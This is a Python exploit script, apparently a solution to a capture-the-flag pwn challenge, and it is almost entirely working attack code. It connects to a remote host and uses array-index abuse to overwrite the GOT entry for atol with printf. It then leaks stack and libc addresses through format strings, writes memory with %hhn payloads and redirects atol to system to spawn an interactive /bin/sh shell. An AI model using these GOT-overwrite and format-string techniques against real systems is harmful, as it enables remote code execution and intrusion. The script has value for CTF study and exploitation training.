#!/usr/bin/env python3
from sc_expwn import *  # https://raw.githubusercontent.com/shift-crops/sc_expwn/master/sc_expwn.py

bin_file = './chall'
context(os = 'linux', arch = 'amd64')
# context.log_level = 'debug'

#==========

env = Environment('debug', 'local', 'remote')
env.set_item('mode',    debug = 'DEBUG', local = 'PROC', remote = 'SOCKET')
env.set_item('target',  debug   = {'argv':[bin_file], 'aslr':False, 'gdbscript':''}, \
                        local   = {'argv':[bin_file]}, \
                        remote  = {'host':'13.231.207.73', 'port':9005})
env.set_item('libc',    debug   = None, \
                        local   = None, \
                        remote  = 'libc-2.23.so')
env.select()

#==========

binf = ELF(bin_file)
addr_got_atol       = binf.got['atol']
addr_plt_printf     = binf.plt['printf']

libc = ELF(env.libc) if env.libc else binf.libc
offset_libc_read        = libc.sep_function['read']

#==========

def attack(conn, **kwargs):
    conn.sendlineafter('n = ', '22')

    for _ in range(14):
        conn.sendlineafter('] = ', '')
    conn.sendlineafter('num[15] = ', '15')
    conn.sendlineafter('num[17] = ', str(addr_got_atol - 17*8))
    conn.sendlineafter('num[18] = ', str(addr_plt_printf))

    conn.sendlineafter('num[19] = ', '%1$lx %3$lx')

    leaks = conn.recvuntil('\n', drop=True).split()
    addr_stack     = int(leaks[0], 16)
    addr_libc_read = int(leaks[1], 16) - 16 if env.check('remote') else 17

    libc.address = addr_libc_read - offset_libc_read
    info('addr_libc_base    = 0x{:08x}'.format(libc.address))
    addr_libc_system    = libc.sep_function['system']
    addr_libc_str_sh    = next(libc.search(b'/bin/sh'))

    payload  = b'%16x'
    payload += b'%10$hhn'
    payload = payload.ljust(0x10)
    payload += p64(addr_stack + 0xe8)
    conn.sendlineafter('num[20] = ', payload)

    payload  = b'%198x'
    payload += b'%10$hhn'
    payload = payload.ljust(0x10)
    payload += p64(addr_got_atol)
    conn.sendlineafter('num[21] = ', payload)

    conn.sendlineafter('] = ', '')

    for _ in range(14):
        conn.sendlineafter('] = ', '')
    conn.sendlineafter('num[15] = ', '15')
    conn.sendlineafter('num[17] = ', str(addr_got_atol - 17*8))
    conn.sendlineafter('num[18] = ', str(addr_libc_system))

    conn.sendlineafter('num[19] = ', '/bin/sh\x00')

#==========

def main():
    comn = Communicate(env.mode, **env.target)
    comn.connect()
    comn.run(attack)
    comn.interactive()
    # zer0pts{0ops_long_is_8_byt3s_l0ng}

if __name__=='__main__':
    main()

#==========
